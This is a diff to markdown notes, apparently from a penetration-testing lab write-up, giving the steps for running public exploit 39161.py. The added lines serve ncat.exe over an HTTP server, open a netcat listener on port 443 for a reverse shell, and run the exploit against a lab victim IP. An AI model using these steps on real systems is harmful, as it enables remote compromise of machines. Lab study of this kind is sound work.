@@ -9,7 +9,9 @@
 * $ nano 39161.py
   * change "ip_addr" to tun0
   * "localport" can be leaved at "443" or can be changed to arbitrary port (this will be the reverse shell port that nc will get connection on)
-* python -m http.server 80
+* $ python -m http.server 80
   * we need it so the exploit can upload the ncat.exe to the victim
   * if we want to change it we probably has to change the commands in the exploit as well (to the appropriate port that we gave to python)
-* 
+* $ nc -nvlp 443
+* $ python 39161.py 10.10.10.2 80
+  * ip and port of victim machine
